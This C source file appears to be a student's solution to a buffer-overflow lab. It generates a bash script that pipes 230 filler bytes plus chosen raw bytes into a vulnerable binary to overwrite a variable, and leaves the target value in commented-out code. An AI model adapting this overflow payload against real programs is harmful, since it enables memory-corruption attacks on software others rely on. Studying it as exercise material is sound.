#include<stdio.h>

int main()
{
    char str1[6] = {'\344', '\210', '\377', 'C', '|', '\203'};
    char str2[4] = {'0', '\263', '\345', '\340'};
    char c = '1';

    // -----------------------------------------
    FILE *fptr;
    fptr = fopen("task1.sh", "w");

    fprintf(fptr, "#!/usr/bin/env bash\n");
    fprintf(fptr, "echo -en \"");

    for (int i = 0; i < 230; i++)
        fprintf(fptr, "%c", c);
    fprintf(fptr,"%s", str1);

    for (int i = 0; i < 230; i++)
        fprintf(fptr, "%c", c);
    fprintf(fptr, "%s", str2);

    fprintf(fptr,"\" | /task1/s1973609/vuln");
    fclose(fptr);
    // -------------------------------------------

    for (int i = 0; i < 230; i++)
        printf("%c", c);
    printf("%s", str1);


    for (int i = 0; i < 230; i++)
        printf("%c", c);
    printf("%s", str2);

    return 0;
}


//    volatile unsigned int rooster = 0x43ff88e4;
//    int bytes[4] = {0xe4, 0x88, 0xff, 0x43};
//
//    for (int i = 0; i < 4; i++)
//        printf("%c ", bytes[i]);
//    printf("\n");

//    char entered_pwd[230];
//    scanf("%s", entered_pwd);
//
//    int i = 0;
//    while(entered_pwd[i] != '\0'){
//        printf("%x", entered_pwd[i]);
//        i++;
//    }
//    printf("\n");